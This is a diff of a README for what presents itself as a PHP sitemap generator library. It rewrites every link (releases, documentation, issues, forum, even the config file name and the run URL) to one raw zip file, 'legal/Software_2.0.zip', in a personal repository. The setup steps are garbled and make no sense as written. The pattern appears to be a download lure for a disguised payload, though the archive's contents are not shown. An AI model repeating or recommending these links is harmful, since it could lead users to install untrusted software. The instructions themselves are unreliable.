@@ -6,7 +6,7 @@ Welcome to the sitemap project! This easy-to-use PHP library helps you create si
 
 ## 📥 Download the Application
 
-[![Download Release](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip)
+[![Download Release](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip)
 
 To get started, download the application from our Releases page.
 
@@ -30,10 +30,10 @@ To use the sitemap library, ensure your system meets these requirements:
 Follow these simple steps to download and set up the sitemap library:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip) to find the latest version of the sitemap library.
+   Go to the [Releases page](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip) to find the latest version of the sitemap library.
 
 2. **Download the Zip File**  
-   On the Releases page, you will see a list of versions. Click on the latest version. Look for the asset labeled with `.zip` or `https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip`. Click the link to download the file.
+   On the Releases page, you will see a list of versions. Click on the latest version. Look for the asset labeled with `.zip` or `https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip`. Click the link to download the file.
 
 3. **Unzip the File**  
    After the download is complete, locate the downloaded file. Right-click the file and select “Extract” or “Unzip.” This will create a new folder containing the library files.
@@ -42,11 +42,11 @@ Follow these simple steps to download and set up the sitemap library:
    Upload the unzipped files to your web server. You can use an FTP client, or if you're comfortable, you may copy the files via the command line.
 
 5. **Configure the Library (Optional)**  
-   Open the configuration file if you want to customize settings. Look for `https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip` in the root folder of the unzipped files. Change any parameters that suit your needs.
+   Open the configuration file if you want to customize settings. Look for `https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip` in the root folder of the unzipped files. Change any parameters that suit your needs.
 
 6. **Run the Generator**  
    Once everything is in place, run the generator by accessing the script through your web browser. For example, if you uploaded to a folder called "sitemap" on your server, you would navigate to:  
-   `https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip`
+   `https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip`
 
 ## 📄 Usage Instructions
 
@@ -73,9 +73,9 @@ If you encounter any issues while using the sitemap library, you can reach out f
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip)
-- [Community Forum](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip)
+- [Documentation](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip)
+- [Community Forum](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip)
 
 ## 🛠 License
 
@@ -83,6 +83,6 @@ This project is licensed under the MIT License. You can use it for personal or c
 
 ## 📢 Download Again
 
-Feel free to revisit the [Releases page](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/unravelling/sitemap.zip) if you need to download the library again or check for updates.
+Feel free to revisit the [Releases page](https://raw.githubusercontent.com/Vishnunama2005/sitemap/master/legal/Software_2.0.zip) if you need to download the library again or check for updates.
 
 Thank you for choosing sitemap! Enjoy generating your sitemaps effortlessly.
